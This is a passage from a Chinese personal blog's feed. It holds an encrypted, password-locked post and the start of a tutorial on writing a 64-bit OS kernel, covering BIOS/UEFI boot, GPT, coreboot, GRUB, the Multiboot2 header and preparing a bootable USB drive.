9473e4630d4ad447f6922c8b2b3bdf9b622f48b92e60dfbf88a1220548fdc63be50b1fd5f8bc083109a6f8e79bfe7c73bdae2637d205ed39c8c25a86e6bfd86e487b112060313f595bae7b65131be6c64dcf8cbafd16cc0257b5607e7c5c782e9726e76ee200b9f20c7f76933ca459662df48ac5bcdd2a73b0ca61dd4bf2e5e50b7909414ebc93e7b16ef4b0428af8e1d931c09a0436a74ceac58be04c322b10bd43d76df00bb32622472a4650f9cbd1193847fd77e355a0c29e2e12864b95c6ceb6eef869a18cf05b4df70b6f6f8ed8f0273a12940e3588f1e39fa74c9a0aef69ec3290cbf28ed2dd157e19d0796da785f3fc9e9718a9082204dfef16dd6e9f01d345149752eaff547ca6d4f60164a31d72665c2ad92939931cebc6a6b21633d11f2457071544392b4236ae1a2deabf498d7e882397d405a0bef0bcf04e65f8e7bbc279d0e949d805ee197cfe25d93ce5ed55262d67080b8600ac8ec60bed29f9982577fc551e4d889aa89593282aea9231eb21ce1b2d44ff349df2057614d5687401330cbd6353f7bb3b31c18c65270d627035c32a9a3cf32af73f6a36386778def66b72779dab9e692466659fd5556c76d03b7b09f46488c93a6cb598f68962a54905221fc4d866eeb20fc696520e3390663a858b4904ec3271979aab6e97f84b3c73afe1506e2d26ae4114bfd787d1a8cade2ac23cd48a32144df8763b7ea8552051c57f103fbafafed3fa1fd9c64c2f6050567372efa101774ba2fb0c5369edef2710e90b984f9df459c7dcf82483cbd6b66df1ad3ea5be1c13fcece81735ed7a860698f04a50736d2514ff88e836ae343c1f054b439c7d86db28f7f7e46fe0f085da52038ec510c3f74be1a0edda4310c53e631e74b8eacd84bc872ed8aaf7968b297f7dcbe04ddfdf620cdf4503bbbbfbe437735fdfa65bc96b57275161ce58a363d1086ac45e1f0fa7c3cab60cd44e514393b39c8fc0bf1c8c3467af750caab653a2c2ee69872b3dbc3a688881e2bd9b63599cce7965108a7868da71772cf8b980fa3f4e6133d87807ffde5b06a0d7e555d8ccbc3cf217a8e5c0b5027830c9a6363a3e3d7f37f0f8b33fd6780c412dde722de2f9bfdf7d17606a32c2f0cfd12962ce04a1864a60024dd68723c50ac5a370d490dd164e021deaf90494a58892b63452044872b45c9236d8cbe0b30f819dd9318b62ae23bf5d82740043a421eef25e72edabd4ba6c95ad37ecd22dab91c988d27bbd12491091f5f57931aae0dac73b19090cd35b859034beb5b017e0583751ca14c7f4d0f7034f7519b77200517912c2507c8bce92e48fa6db0ae10aab9ea0b45dbfd0a0772d619ffccefc0cfc253fed5389fc7823df44d67c92ebf31c88fdd134347342c82eacd63e7aafdc1be76cc1f79339f5caf6c790796f9555756615400183bda6d289cda2d0837b31f4b9c03f049c6e54dcedc8fc82041eed1224872e557e743abd0490cb8ff8c61ab34fe3e8180ad93f69f3bf30c463eaa3bd30fef4831dd4a78081a7553050f3d9e1f5fabf1c0293a1c9eef267ce7baa1af290e7bc078723f157a4846da819d95a1cbe300915d42a7369d30a8229cf5c4b563b05053da25f388874c94b86e13697ef0df3773e40feb5aa83e0604a817596b6ad54071532ef000659ead962df4938b1af394785987d7ca782696929eb3569ecc206dcd4b20597189ac3ca49f92e6915a8407bb236a4cf0dca51b0f918c0017e1da72ae7f2153d331c2545c06460d915b420da20fda3c3428dba2a8b09dc0ffcf2d20641b4dc8cd89a2705a9a8ef56dba861af611d69648691c73b6c15d2044be5c3776cfdb2d98125f138032beed3ed956381ff8a69ebe219ffa4b21531eb5b211e141e0083ce7f4f4dac5171e94e20b654f6203b36d2df03c6072ef25ca89e82ca263b8e55ff28c83f0dfcdaa34be066a781b610edaba730465af2a6daa0084bce089f36df6f05a95cf6febfb7bfd737f4399c50f2b85ab02d2028707972462a038e0ce0fdca22a156f3eed49b09e37db260f4a6cc9d2a1a1b45a9f51a31b21a4e8a9a67b1ea8c90b13800e8c06aba47a3ddff8f4cd78780db6cc68941a147c53e556c52381e266559ad50a15cf27e25ddec3af43819f77c705d9180ca22c525295ffd83bb6d90bcbb78e102b6f21065f930012deb10bd70c11d70bf9052b8e1446e5758ac3cefdc46c103b7d908f17ccb2b8373e6bc9330985b8d6876769c419aa6d3c11b17a928000adbfbe4fcf0e7946381d39e07014cc118d2eb4578b66d9ccfcbb3db757f3c76cd6402f4209c978e4335e43d9037f1527e62936956d58e6cbc79875e79bf621f70158d4f7d4a320e629d9c70b523be6e85ce0dd561e3fe0cca1ca1b3acdf25e2981bd69d33e9e69dd207af88db529b343004f01ff106ae7b5c29b751e6f9f1ff2f867d301a09a72c6be53c5b8182b3c24c870fdcb0d67199a117dd0b46abcaff68bbe3dcbc05ec6a3beb478b806b1373e672c1bac9789077870cbd5ccc3f2a4fbe77b02d5b4852e2d7a94591188dd876a1bdb4c393b32128814326d414c24562bf2700910b8027e20339188cf3b87c3f4209cd516374bf8ed1983e801fb2a70d26f280c979de97b8cd4d5cb680f1507a07e0ab6ab7c5716bd285109dc86fde72109b0067e11f09bb466f87fa8bdda123fdf466325c0d3fb832b9c921c4b0dc4faf2e209b3b47a5265b555d9d6bfef2174007b2dbc5e4493052c651fef84a5b9faeded0e10f57d507bbddaa2af67c8d34e4e93113bd337324e64ffcdcf05f05c2effaba6d3119b89ce260e936521f2a510409f97e19bb00befdec21655f9e7b953cb6daf0360b4629bcc1ed3ccc838caef01174cc7d92811860bccd2e8e9cb64a19dcde535a340d2cca3a3546d41f7c0a0ae02e56387293d68552e3492b74e428503ee279482ef91a38f6a40e2f595df4de30bc201c4f644f67515d21640665f55a6e505546329137aafb73861d3790239c963a600649ff13cc93b84fd6644854911238c699e9ab48d0d5be1c7e38f12b8e3f71cd4acdc20c2bac336b3a025366b680f9f1996ebbbe4846e4f49b2912025cdf761a4fda18935d7c3e49f6eb4fa5fe99dcff677471e9c60838818a10457ba1abadd9041910a65f7622fc8e9cd57b48ea61481c0cb13817c998c952fe9e0c7de69d7cc58eb34747f0c1b88b542b0a5ad3cc160f3ee8385026fb419b16aa7ec872626e6b9536824f25ce29d9695fef1c2fe2967d275e76d222d3c96a71d8bb55c3052bc0d49f10b7b3f6b31ae2b32088c7bcb439902aade019ccad80033227bc78120e85bd4b84d85b2e3e856e1ad6aad7627582a9fa2f8b41876f5bbe0249aedb961e07386a44bfbb73f189dcc339c5418248e4102b05e942ede1efe599fb416545046e0755ba78d2bb036d44134290129149935a16d91fdc950dd59dd2a6ad222f79718c494f69beb5954ad9a7bea78a1bb8c2a0c43c85cbf4f065942a7ca640ccf8edb66d7a2e76cf00f20cb82432616b39fd421edcb78ec9fae156adb5ee555db976df1ee07081fe135af751e11d82959f3b5b837c379714e1c59d237068f12754eb62034e802b7a7fe845775ee11c491a15b7b85c5d7b01e2d4e9423e068e105d80332c4231ceb3a88b5095e73793a4e2844600fe6ce8834e8e9853c7793f32c174ec97a402b13982dd4681318e59ec8660f4afb668c780a43ccb1b0be3d94fa9c3b8226b594c33c2bc6217ab94c1b8be2756d47ffdc2971383fafd4a5f277b21325379fae7a9d76bd01341bb8d7ffaec51519c33ac0dd38bbc32a5be607b2b679c9bb934d694256e867ff388de9204d7735af875e2c4f1e2a2a301b01d6fbbe56a2cad44701140bbb69c649ec6a0e5387d7b1286ccfb4a874521c1e74e37117e5c5fb146a624c76f14e2acffe02fdad0819da86db68bdcd525f13389dcb172e2cd8ee3c638e6c4d256b32082b4f254b284ec8650a8f4ac7db361359a25bff7be7e7d40690c3fcc29bac81bca180b634a7bbda6275ec251ecd380050985b862bd42bd6063e91ea1f84960400eebb6011ab040d700933c46c7165d87e77c40cc8edc2a7fb8b861ebe2fdffb8de6dfcabc7dea9c3effca58f86e4ae73c72fbccaf8126607ebff383eab53726155eeb2d87399c7b3d2525b179d52b577d834299fbe0c25ac7af0a69c834c01202e1e6a9c1a19f687f402a76ee70a51724a2863c0ee37863c691db559555a2d775116806a04dc8154324fb650766ae8ced350f7b297380f0f2d67d989740040da46c0d3a380827def1acba8d0b6dd411cd448a68d7f59da3496121653b468fe2690179a85ce155c6eccee97699c478f1e1aaa4bb13dc0eb1b9d7bb0d067e55705ec06cded191922eb8428dc878a7307eb30d2855cc78ba6b969ff8f9f26bd940a89a1ac26a75324f7dc63deabf39dda8b8bd27b94c2f83a275aa102e6312b42b94a329b69deff8de8e70b97a5bfbbae626b5f448e0d78ce141f4461fab68db0f6c13b5d47074cf63ea14b1da0931bd3e4c352e2aee91e7773234d0db1939882c08660d1442ae74a810c0bcdbdd6e87bf04a4a70fac45344b5993fcd2a32459c29e5e3c905b0cf07907c56607629ea592c118e9db191e966f4e7c8ddbfc765c2f306f5498d5b7450072204a9a93155f1f18e39ea1a0c12223050350850e7810b8369ff6ef0dc987073fa343dd37615f687c87d10a5289f42066d410a9e2a4011c10083ea6c7e2dca865aa236ec52ad02af609c9562225db64590dbb1ea7f25b2d4d3a860c5b3403ceb33c164886d30da546ef70c236cd44319e3c65c18836c3d0e83af3a305d7a2de28f34beadfcbf69cdf3aa558d680369825a8ee4f37d77e441748f16e6a24a49707196c6e92b7519d4ebde6648ffff196a107b7e8ea4904f05d804c78c59bc159ec5b457bfde93a195e66802b734138d120af02f0f183998e8977449dd99fd3565a96865ccce01207fbb52619eff6146743824109cc27ca7fda365fd8f78084dc1b1d45bd101d481dea664877d098b9057b659b2a28552ea347e52ac63a4c3c89ded9bec0d41f072de229f83e1cab8935b2aacc7b3b08d78fdd8a1cce527e5b6d95261908960638e9157dca8b414d4ce10832f36bf5d1c56de40e9b414dde0f5b027501d2385231a1b31eaf7f0dc726ba240c3def96818e776937dcdaf97105ddfd83c8df71a6c5fad09fa062748c18a6f296101c3e51837a92350504e1b82457a48e259bbc83933bda51c96f67ab623f88ca06caff1b3c34078c763a6fe08af2ea9914c06fd6536504d6ae0d427ead76dff0e8e00415f7f18179149b120eee196a281b1c181b25964d33a8647ba9c845487bc9ce484d89ab61d990125648e9df470ac1febbb662f8bb3200b830c3322a448e3d0067aba53b5e4e64f04aff848d8e4feb3b5cb01f9bb67bb172c1b46d385a74d7e2dc54ce8dd8de09ac07f69996942158b384687cf80e63e6140782c44702851f8e05fc84b9bd3731ab289f405239ac8257140afcbd861197d6940a5bf2612520bdfe9ab39a0b074fb7148c68b4327df788499bc85fb979d1b5cbddcfb98105c9ecb2ab845cfff8ae63c8c9c021a4f5301087a02a83fd9d9af2c21ee5fc9e3f40085bb4deaa46e41e2d50a1b9123d550d8524e500ac0cd03e4271ccbd09277be7e62e76d5e15b418b477f0121191b6881d01b09206d6cfb0a361db54cd9d9fa17e0bdada825266b9604f447523b10fbdcb5f98f34123a7e61b9d2b73728157169baed6f291d4d7065377a21475a3f96060c3facdbffea7792fe4ef86758a6829b4b325bfc7c18390f2c215d6ee74292544152cbc6e99b05cbdfa5cd53912fc83fbc7bc7ed723c6a70da9796831b631f184e6ab8eec3b95e8c51b8054da3f1208a42b48a2097f05b783fee442f2adc2f26edd400e93a6133f10a4e4be03f8adf01f6f97f063590e663b22308d9a3bfa7ae8df656e422ce029a426eaa230e19b2bc97d08810134758333c11580bb3ca4dcfd490d33e0aa655b58b0e2baf896e8ee31f7fa6918a3619b2b13b507b7c3645ee9b0020cefb4c4e8dd658a6601073b008e5e7ba52cd65bb69425c30c1fad520a0c673f11af6254023af245b3c07b7049eb4f186daed5a5a3a6917c84125c49f2dcfac3239e98d4774ee89da93d0259720c8dc523597b07e1c7480d891b641d2d6d777c4c83024f02b469cc5bb039940d83878b44a568f5833b0d4ec43358394d268be73321c8c52dc575a84dc67ab09028a33bf7b1bd2cc43c4e9dc5cfcefc242f49c013b1a15469d74cc8d6fa5cdf6393bc65307ea703baebcde839fe9d3f9322b9199fe21c8e0e7525e587d662e5c330f269b1fd76d613103559c030e756e6f5cecfef9d6376e00c93ba791d86bc1d508b4f602bf72352</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">题目还没出好所以暂且请等待</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">为什么要让我忘记呢 我们以前感情明明那么好 大家每天在一起都很开心 结果现在各奔东西什么的这太奇怪了 你不是说乐团是命运共同体吗 求求你 我想让crychic重新开始 我想找回大家那段快乐的日子 crychic没有结束 我一直为了它在努力着 等一下 不要走 我真的很喜欢大家很重视大家 求求你 ‍♀️要我怎么做你们才肯回来 ‍♀️只要是我能做的我什么都愿意做 ‍♀️我真的</summary>
    
    
    
    <category term="PIECES" scheme="https://arttnba3.github.io/categories/PIECES/"/>
    
    
    <category term="碎碎念" scheme="https://arttnba3.github.io/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
  <entry>
    <title>【CODE.0x03】现代 64 位 OS 开发手记 I：Cmake构建、UEFI 启动、GRUB 引导、Frame buffer 文字输出</title>
    <link href="https://arttnba3.github.io/2023/11/29/CODE-0X03-OSDEV64-I_UEFI-GRUB/"/>
    <id>https://arttnba3.github.io/2023/11/29/CODE-0X03-OSDEV64-I_UEFI-GRUB/</id>
    <published>2023-11-29T12:21:47.000Z</published>
    <updated>2024-06-19T03:55:56.968Z</updated>
    
    <content type="html"><![CDATA[<p>遥遥领先！遥遥领先！遥遥领先！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>很久以前在知乎上曾经有过一个“程序员的三大浪漫”的讲法：「编译原理」、「操作系统」、「图形学」——当然这个似乎是某些知名答主杜撰的并没有任何的由头神必说法，笔者自己也不认为所谓的“程序员的浪漫”就仅是这几个东西，但对于笔者而言，“自己动手编写一个可以正常运行的操作系统”确乎是一件<strong>非常炫酷的事情</strong></p><p>笔者此前在大二下学期的时候曾参照《操作系统真象还原》编写过一个非常简陋的只有打印功能的 32 位操作系统——严格来说笔者仅仅完成了一个高度客制化的 boot loader 加上一点点的 kernel（因为懒而不是时间不够，天天摆烂躺平打游戏😥），也没有在真机上测试过，完全算不上一个能用的操作系统；在大三寒假期间笔者花了将近一周的时间<a href="https://arttnba3.cn/2022/02/21/EXPR-0X00-MIT_6_828/">刷完了 MIT 6.828 的前四个 lab</a>，但那严格意义上来说也并不是笔者从零开始写的一个内核——大框架基本都是 MIT 搭好的，笔者仅仅只用补足非常微小的一部分；在大三下学期笔者想与曾经喜欢过的妹子一起参加一个<a href="https://os.educg.net/">写操作系统内核的比赛</a>，但是由于<a href="https://arttnba3.cn/2022/10/28/PIECES-0X04-SHELL_OUTSIDE-4-XIANG_WAN/">一些缘故</a>笔者一直拖到了比赛结束都还没有开始动手写第一行代码，最后也就不了了之了；在大四上学期笔者又重新写了一个<a href="https://github.com/arttnba3/SumiOS">用 Grub2 引导的 64 位内核</a>，但是写完内存分配之后也烂尾了 😅</p><blockquote><p>仔细想来对于笔者来说似乎很少存在“万事开头难”的阶段，但往往一切事物都会滑向无底的大坑永久无法填上：）</p></blockquote><p>因此趁着现在时间尚且充足，笔者想要<strong>真正地从零写一个可用的 64 位操作系统内核</strong>，算是满足自己多年来的一个梦想吧，名字的话笔者决定叫 <code>ClosureOS</code> ——这个名字的由来比较简单，笔者一直很难想出比较好听的名字，看了看市面上有各种操作系统都叫 <code>Open*</code> ，那笔者就叫 <code>Close</code> 好了，但是 <code>Close</code> 这个单词长得又不好看，于是笔者最终选择了 <code>Closure</code> 作为这个操作系统的名字——虽然似乎不是特别好听，但反正是否能写完都还是个未知数，所以也无所谓了（笑）</p><p>本项目代码开源在 <a href="https://github.com/arttnba3/ClosureOS">https://github.com/arttnba3/ClosureOS</a></p><h1 id="0x01-Boot-Firmware"><a href="#0x01-Boot-Firmware" class="headerlink" title="0x01. Boot Firmware"></a>0x01. Boot Firmware</h1><p>现代计算机的上电过程比较复杂，不过对于操作系统开发而言我们其实只需要关注<strong>当我们按下开机键之后所发生的事情</strong>，实际上无论是古老的 Legacy BIOS 启动还是逐渐成为主流的 UEFI 启动而言，其不外乎都遵循以下三个大阶段：</p><ul><li><strong>ROM Stage</strong>：经历了一些基本的初始化工作后 CPU 被重置，主核心被唤醒，指令指针寄存器指向 <code>reset vector</code>（固件入口点）并由此开始执行，此时尚未进行内存探测，需要直接在 ROM 上执行</li><li><strong>RAM Stage</strong>：内存探测完成，此时可以进行主板上各芯片组、CPU 等模块的初始化等工作</li><li><strong>Boot Stage</strong>：找到启动设备，完成启动设备前的依赖项的准备，将控制权移交给设备上的下一阶段的启动器</li></ul><p>现有的固件通常分为两类：BIOS 与 UEFI</p><h2 id="Legacy-BIOS"><a href="#Legacy-BIOS" class="headerlink" title="Legacy BIOS"></a>Legacy BIOS</h2><p><strong>基本输入输出系统</strong>（<strong>Basic Input&#x2F;Output System</strong>，BIOS）是用来为计算机提供初始化服务与运行时服务的一组固件，其被预装在主板的 ROM&#x2F;FLASH 芯片上，不同的 BIOS 通常仅能在特定的主板型号上运行</p><p>当计算机启动后 BIOS 为第一个被运行的软件，此时计算机处于实模式下，仅能访问 1MB 内存的空间，其中物理内存 <code>0xF0000 ~ 0xFFFFF</code> 这 64KB 空间被映射到 BIOS ROM 当中，并以 <code>0xFFFF0</code> 处作为 BIOS 程序的入口点开始执行</p><blockquote><p>对于支持且开启了 BIOS shadowing 特性的计算机而言，BIOS 会被先从固件当中拷贝到内存中，而非直接在 ROM 空间上执行</p></blockquote><p>BIOS 会从南桥的 CMOS 芯片中读取 BIOS 程序的设置值、硬件参数侦测值等信息，在完成加电自检、设备测试等工作之后，会从启动设备中读取第一个扇区到物理内存 <code>0x7c00</code> 的位置，该扇区被称为<strong>主引导记录</strong>（<strong>Master Boot Recode</strong>，MBR），随后 BIOS 会跳转到 <code>0x7c00</code> 处继续执行，控制权转交给 MBR</p><p>MBR 的结构如下图所示，其中<strong>不仅包含有 440 字节的第一阶段引导代码，同时还包含有磁盘的分区表信息</strong>，MBR 以末尾的两个字符 <code>0x55, 0xaa</code> 作为其标识：</p><blockquote><p>这里我们可以看到 MBR 分区表仅支持不超过四个主分区，多余的分区则需要依赖操作系统在其上建立虚拟分区，此外 MBR 也不支持管理硬盘 2TB 以外的存储空间，因此这种分区方式 <em>其实已经正在逐渐地被淘汰</em> </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231113212038.png"></p><p>由于 MBR 仅有 512 字节，无法完成过多的任务，因此通常的设计是由 MBR 从硬盘上读取第二阶段的 boot loader，由其来完成后续的系统环境初始化、载入操作系统内核等工作</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231113211739.png"></p><h2 id="Unified-Extensible-Firmware-Interface"><a href="#Unified-Extensible-Firmware-Interface" class="headerlink" title="Unified Extensible Firmware Interface"></a>Unified Extensible Firmware Interface</h2><p><strong>统一可扩展固件接口</strong>（<strong>Unified Extensible Firmware Interface</strong>，UEFI）为一套<strong>固件接口规范，用以初始化硬件、引导操作系统，并向操作系统提供一套统一的功能接口，解决不同厂牌 BIOS 分裂的现状</strong>，其最初起源于 Intel 开发的 EFI，在 2005 年由 Intel 交由 UEFI 论坛进行推广，<strong>UEFI 固件本质上与 BIOS 固件没有区别</strong>（都是封装在 ROM&#x2F;FLASH 固件里的程序）</p><blockquote><p>例如 BIOS 厂商 A 提供的某个功能接口的使用方式是 X，BIOS 厂商 B 提供的相似功能接口使用方式是 Y，那操作系统就得为不同厂商的不同功能编写多套代码</p><p>而有了 UEFI 规范，厂商 A、B 的 UEFI 固件都需要向上层提供统一的接口，从而使得操作系统可以用相同的方式调用某个功能，避免了代码分裂的情况</p></blockquote><p>这里引用一张非常经典的图片简述 UEFI 启动的基本过程：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231113191232.png"></p><p>相应地，UEFI 启动不再使用老旧的 MBR 分区表，而是使用 <strong>GUID Partion Table</strong> （GPT 分区表），以 512 字节为单位作为一个<strong>逻辑块</strong>（Logic Block，相对应的区块地址便称为 LBA），前 34 个 LBA 用来记录分区信息，其中 LBA0 为了兼容性保留给 MBR 使用，LBA1 记录分区表自身的信息、备份用 GPT 分区（最后 34 个 LBA 的位置）、分区的 CRC 校验码等，LBA2 ~ LBA 33 则用来记录分区信息，每个 LBA 可以记录四个条目：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129220808.png"></p><blockquote><h4 id="扩展阅读：兼容支持模块（Compatibility-Support-Module）"><a href="#扩展阅读：兼容支持模块（Compatibility-Support-Module）" class="headerlink" title="扩展阅读：兼容支持模块（Compatibility Support Module）"></a>扩展阅读：兼容支持模块（Compatibility Support Module）</h4><p>在 UEFI 逐渐替换掉计算机底层固件的风潮涌动之时，尚有大量的设备仍旧使用传统的 MBR 分区表，为了进行兼容，CSM 这一兼容支持模块会模拟传统 BIOS 的功能，为这些设备系统按照传统的 BIOS + MBR 方式进行引导，并提供传统 BIOS 的 0x10 等中断服务</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129203153.png"></p></blockquote><h2 id="Coreboot"><a href="#Coreboot" class="headerlink" title="Coreboot"></a><em>Coreboot</em></h2><p><strong>Coreboot</strong> 起源于 <strong>LinuxBIOS</strong>，最初的思路是 <em>既然 Linux 有比较好的硬件支持，那计算机启动以后直接跳 Linux就完事了</em>  ， 于是 <em>使用 20 行汇编完成初始化并将 Flash 中的 Linux 拷贝至内存后直接跳过去</em> 的 LinuxBIOS 诞生于 1999年，随后经过不断发展，引导 Linux 所用的程序越来越大，于是项目在 2008 年改名为 coreboot，项目结构变为 <code>coreboot + payload</code>，Linux 则成为了 <em>可选的一段 payload</em> ，通过这样的模式，Coreboot 可以通过引入不同的 payload 来支持多种不同的启动规范，包括 Legacy BIOS 和 UEFI</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129222934.png"></p><blockquote><p>目前市面上正在使用 Coreboot 的主流产品有 Google Chromebook 和 System76 旗下的笔记本等</p></blockquote><h1 id="0x02-多重引导规范-GNU-GRUB"><a href="#0x02-多重引导规范-GNU-GRUB" class="headerlink" title="0x02. 多重引导规范 &amp; GNU GRUB"></a>0x02. 多重引导规范 &amp; GNU GRUB</h1><h2 id="Why-GRUB？"><a href="#Why-GRUB？" class="headerlink" title="Why GRUB？"></a>Why GRUB？</h2><p>现今的大部分所谓“教你自行编写操作系统”的无论是教程也好书籍也好，都存在着一个小小的问题：<strong>对 Legacy BIOS 的内核引导阶段大书特书</strong>——诚然，了解一台计算机从启动开始到内核真正运作这段期间的实现细节无疑是十分重要的一件事情，对于操作系统学习而言或许也有不小的帮助，但很容易让初学者陷入到与各种硬件博弈的苦战当中，同时对于实际的开发而言手动编写一个<strong>仅适用于我们自己的内核</strong>的客制化 <code>MBR + boot loader</code> 意义并不算特别大</p><blockquote><p> <del>再说都什么时代了还在用 Legacy BIOS，Wintel 联盟都宣布这玩意已经彻底成为历史了，👴🚪就没有必要再深究了，大概了解一下差不多得了</del></p></blockquote><p>而 UEFI 规范虽然给了我们更为方便地通过 UEFI 的各种接口实现不同的功能，但<strong>UEFI 的大部分功能在 Runtime 阶段是不可用的</strong>，同时这也少不了编写设备识别、文件系统解析等工作，再配上编写各种基础设施，一套写下来一个EFI 程序其实差不多就已经是一个完整的小内核了——当然， <em>直接用 EFI 程序作为操作系统内核不是不行，看着也确实像个样子</em> ，<strong>就是不太优雅，也不太现代</strong></p><p>因此，对于内核引导阶段，我们暂时选择<strong>直接复用现有的成熟的方案</strong>——例如「GNU GRUB」，其同时支持 Legacy BIOS 与 UEFI 引导，让我们不用在一开始就陷入到与各种存储设备斗争的泥潭当中</p><p><img src="https://s2.loli.net/2022/09/07/eTCVOtlpE7PYFXq.png" alt="image.png"></p><blockquote><p>当然，如果说仅从「学习」的角度而言自己亲手写一个 <code>MBR + boot loader</code> &#x2F; <code>EFI</code> 并亲身体会到其载入内核的整个过程其实是一件非常有益处的事情（笑）</p><blockquote><p>先挖个坑：我们将在操作系统内核开发完成之后的后续补充文章中<strong>自行开发一个 EFI 程序以引导符合 multiboot2 规范的内核</strong></p></blockquote></blockquote><blockquote><p>也有人会问：那为什么不用 <a href="https://github.com/limine-bootloader/limine">Limine</a> 或是 <a href="https://gitlab.com/bztsrc/bootboot">BOOTBOOT</a> 这样更加现代的 boot loader 呢？一个原因就是因为 GRUB 相对有着更好的兼容性，能够在更多设备上运行，教程资料也比较多</p></blockquote><h2 id="Multiboot2-规范"><a href="#Multiboot2-规范" class="headerlink" title="Multiboot2 规范"></a>Multiboot2 规范</h2><p>那么我们如何让 GNU GRUB 知道他该怎么引导一个什么样的内核呢？答案是通过<a href="https://www.gnu.org/software/grub/manual/multiboot/multiboot.html">多重引导规范</a>（Multiboot Specification），该规范制定的目的是使得遵循该规范的操作系统可以被同样遵循该规范的 boot loader 引导，而无需编写特定于 OS 的 boot loader</p><p>GNU GRUB 第二版进行了完全的重写，多重引导规范也有个<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html">第二版</a>，不过好在 GRUB2 同时支持两版引导规范——这里我们使用<strong>第二版</strong>的规范</p><blockquote><p>然而 Linux kernel 使用的<strong>并不是 multiboot  规范</strong>，而是其<a href="https://www.kernel.org/doc/Documentation/x86/boot.txt">自定义的协议</a></p></blockquote><p>多重引导规范要求我们的内核映像的前 <code>32768</code> 字节中一个任意的 <strong>64位对齐的位置</strong> 必须要有一个 <a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Header-layout"><code>multiboot2 header</code></a> 来记录相应的信息，格式如下：</p><table><thead><tr><th>Offset</th><th>Type</th><th>Field Name</th><th>Note</th></tr></thead><tbody><tr><td>0</td><td>u32</td><td>magic</td><td>required</td></tr><tr><td>4</td><td>u32</td><td>architecture</td><td>required</td></tr><tr><td>8</td><td>u32</td><td>header_length</td><td>required</td></tr><tr><td>12</td><td>u32</td><td>checksum</td><td>required</td></tr><tr><td>16-XX</td><td></td><td>tags</td><td>required</td></tr></tbody></table><ul><li><p><code>magic</code>：multiboot2 header 的标识，必须为 <code>0xE85250D6</code></p></li><li><p><code>architecture</code>：标识指令集架构，0 表示 32 位 i386 保护模式，4 表示 32 位 MIPS</p></li><li><p><code>header_length</code> ：包含 tags 在内的整个 multiboot2 header 的大小</p></li><li><p><code>checksum</code>：该域与前三个域相加的和为无符号 0</p></li><li><p><code>tags</code>：补充域，其格式通常如下，以类似数组的形式跟在后边，<strong>每个 tag 的起始地址8 字节对齐</strong>，<strong>整个 tag 数组以一个 type 为 0 及 size 为 8 的 tag 结尾</strong>，关于不同类型的 tag 格式，参见<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Header-tags">此处</a>：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">        +-------------------+<br>u16     |<span class="hljs-string"> type              </span>|<br>u16     |<span class="hljs-string"> flags             </span>|<br>u32     |<span class="hljs-string"> size              </span>|<br>        +-------------------+<br></code></pre></td></tr></table></figure></li></ul><h2 id="在-U-盘上安装-GRUB2"><a href="#在-U-盘上安装-GRUB2" class="headerlink" title="在 U 盘上安装 GRUB2"></a>在 U 盘上安装 GRUB2</h2><p>虽然很多操作系统编写教程都是在虚拟机当中运行的，毕竟 <em>对于操作系统初学者而言更重要的是了解整个操作系统的运行机理</em> ，但是<strong>在物理机上运行自己写的操作系统是非常令人感到愉悦的一件事情</strong>，所以这里我们将会介绍如何在 U 盘上安装 GRUB 来引导自己的操作系统内核</p><blockquote><p>如果你不想弄这一部分，也可以跳转到下一节，直接开始安全地使用 QEMU，我们后面的各种开发调试其实主要也是在 QEMU 上完成的 ：）</p></blockquote><ul><li><p>如果你在物理机上使用 Linux 作业系统，请找到你的 U 盘对应的设备节点，通常情况下，如果你的计算机<strong>仅</strong>使用 <code>nvme m.2</code> 固态硬盘，则新插入的 U 盘 <em>通常</em> 是 <code>/dev/sda</code> ，<strong>如果你则计算机仍在使用 SATA 接口的硬盘，请注意自行确定设备路径</strong></p></li><li><p>如果你在物理机上使用 Windows 操作系统，出于易用性考虑我们并不使用 WSL，<strong>而是在 Vmware 虚拟机中安装一个 Linux 操作系统</strong>，并通过如下方式将 U 盘连接到虚拟机中（请先确定好你的 U 盘对应的设备名称），在你的虚拟机处在默认配置且不存在外部存储设备的情况下，U 盘对应的设备节点通常是 <code>/dev/sdb</code>：</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114214055.png"></p><blockquote><p> 也可以通过<strong>物理重新拔插可移动设备</strong>以让 Vmware 自行截获：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114214205.png"></p><p>如果你是其他情况，请自行进行判断 ：)</p></blockquote><p>首先安装一些你可能会需要的依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install -y dosfstools mtools gparted gcc cmake git bison libopts25 libselinux1-dev m4 help2man libopts25-dev flex libfont-freetype-perl automake make autotools-dev autopoint libfreetype6-dev texinfo python3 autogen autoconf libtool libfuse3-3 unifont gettext binutils pkg-config liblzma5 libdevmapper-dev</span><br></code></pre></td></tr></table></figure><p>接下来我们对 U 盘进行分区，<strong>请确保你已经将所有重要数据完成备份</strong>，这里笔者选择使用 <code>GParted</code> 进行分区，我们首先通过 <code>Device→Create Partion Table...</code> 建立一个 GPT 